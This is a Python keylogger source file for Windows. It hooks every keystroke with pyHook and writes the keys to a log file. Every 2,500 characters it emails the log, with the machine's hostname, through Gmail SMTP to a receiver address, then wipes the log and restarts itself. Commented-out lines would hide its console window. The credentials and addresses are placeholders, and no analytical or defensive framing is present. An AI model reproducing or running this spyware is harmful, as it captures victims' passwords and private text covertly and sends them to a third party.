
import pyHook, pythoncom, sys, os, smtplib
import socket
#import win32console, win32api, win32gui
#win=win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)
############# MEANS NEEDS TO BE FILLED IN
file_log = 'LOCATION OF LOG FILE'

#emails file
def SendFile():
    tempf = open(file_log,'r')
    content = socket.gethostname() + ' ' + tempf.read()
    tempf.close()

    tempf = open(file_log,'w')
    tempf.seek(0)
    tempf.truncate()
    
    mail = smtplib.SMTP('smtp.gmail.com',587)
    mail.ehlo()
    mail.starttls()
    mail.ehlo()
    #############
    mail.login('SENDEREMAIL@gmail.com','EMAILPASSWORD')
    #############
    mail.sendmail('SENDEREMAIL@gmail.com','RECEIVEREMAIL@gmail.com', content)
    mail.close()
    
    python = sys.executable
    os.execl(python, python, * sys.argv)

#checks if read to sent // not very efficient
def Sendcheck():
    ncharacters = 2500
    file = open(file_log,'r')
    string = file.read()
    file.close()
    nstring = len(string)
    if nstring%ncharacters == 0 and nstring != 0:
        SendFile()

#formatting text
#might be better to open file somewhere else and keep it open
#also needs more efficient checking method
def OnKeyboardEvent(event):
    if event.Ascii !=0 or 8:
        try:
            f=open(file_log,'r')
        except:
            f=open(file_log,'w')
            f.close()
            f=open(file_log,'r')
        buffer=f.read()
        f.close()
        f=open(file_log,'w')

        if event.Ascii == 27:
            keylogs = "[ESC]"
        elif event.Ascii == 8:
            keylogs = "[Backspace]"
        elif event.Ascii == 0:
            keylogs = ""
        else:
            keylogs=chr(event.Ascii)
        buffer+=keylogs
        f.write(buffer)
        f.close()
        Sendcheck()
        
#captures keys
while True:
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

